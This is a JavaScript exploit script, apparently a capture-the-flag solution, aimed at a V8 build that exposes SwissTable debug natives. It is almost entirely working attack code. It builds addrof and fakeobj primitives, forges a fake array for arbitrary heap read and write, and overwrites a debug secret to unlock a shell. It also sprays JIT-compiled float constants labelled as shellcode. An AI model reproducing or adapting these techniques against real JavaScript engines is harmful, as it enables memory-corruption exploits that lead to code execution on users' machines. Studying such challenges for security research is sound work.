var DEBUG = true;

var buf = new ArrayBuffer(8);
var dv = new DataView(buf);

function dp(o) {
    if (DEBUG) eval("%DebugPrint(o)");
}
function hex(p) {
    return "0x" + p.toString(16);
}

function packU64(lower, upper) {
  return lower | (upper << 32n);
}

function u2f(u) {
    dv.setBigUint64(0, u, true);
    return dv.getFloat64(0, true);
}

function f2u(f) {
    dv.setFloat64(0, f, true);
    return dv.getBigUint64(0, true);
}


function s2u(s) { return s >>> 0; }


function printh(o) {
    console.log(hex(o));
}

function print(o) {
    console.log(o);
}


const shellcode = () =>
{
    return [1.9553825422107533e-246, 1.9560612558242147e-246, 1.9995714719542577e-246, 1.9533767332674093e-246, 1.9554469318824527e-246, 1.971182898881177e-246];
}

for (let i = 0; i < 0x20000; i++) {
    shellcode();shellcode();shellcode();shellcode();
    shellcode();shellcode();shellcode();shellcode();
    shellcode();shellcode();shellcode();shellcode();
    shellcode();shellcode();shellcode();shellcode();
}


function fakeobj(ptr) {
    let x = u2f(0x100000000n);
    let arr = new Array();

    arr[0] = u2f(ptr);
    arr[1] = u2f(0x4343434344444444n);

    return %SwissTableKeyAt(x, 0x5);
}

function addrof(obj) {
    let x = u2f(0x0041414141n);

    let arr = new Array();
    arr[0] = obj;

    let addr = 0x0;
    for (let i = 0; i < 4; i++) {
        addr |= %SwissTableDetailsAt(x, 0x4 + i) << (i * 8);
    }
    return BigInt(addr);

}

function readHeap4(ptr) {
    let bv = 0x10000000n | ((ptr - 8n) << 32n);
    return BigInt(%SwissTableElementsCount(bv));
}

let obj = {a: 1234, b: 0x1111};
if (fakeobj(addrof(obj)) !== obj) throw "addrof/fakeobj failed :(";

print("we ballin");


let arr = [1.1, 2.2, 3.3];

let dblMap = readHeap4(addrof(arr));

let dataArr = [
  u2f(packU64(dblMap, 0x00000219n)),   // map + properties
  u2f(packU64(0x41414141n, 0x8n << 1n)), // elements + length
  u2f(0x4343434343434343n),
];


function setPtr(ptr) {
    dataArr[1] = u2f(packU64(ptr, 0x8n << 1n));
}

addrof({});
addrof({});

let arbArr = fakeobj(addrof(dataArr) + 0x80n);

if (arbArr.length != 8) throw "faking arbArr failed :(";
print("we balling x2");

function writeHeap8(ptr, value) {
    setPtr(ptr - 8n + 1n);
    arbArr[0] = u2f(value);
}

function readHeap8(ptr) {
    setPtr(ptr - 8n + 1n);
    return f2u(arbArr[0]);
}

// addrof being annoying
addrof({});

// needs to fail!
if (%SwissTableShell() !== undefined) throw "bricked";

let debugSecretOff = 0x40000n + 0x200n;
let debugSecret = 0x0000013376969420n;

writeHeap8(debugSecretOff, debugSecret);

if (readHeap8(debugSecretOff) !== debugSecret) throw "overwriting debug_secret failed :/";
print("we ballin x3");

%SwissTableShell();
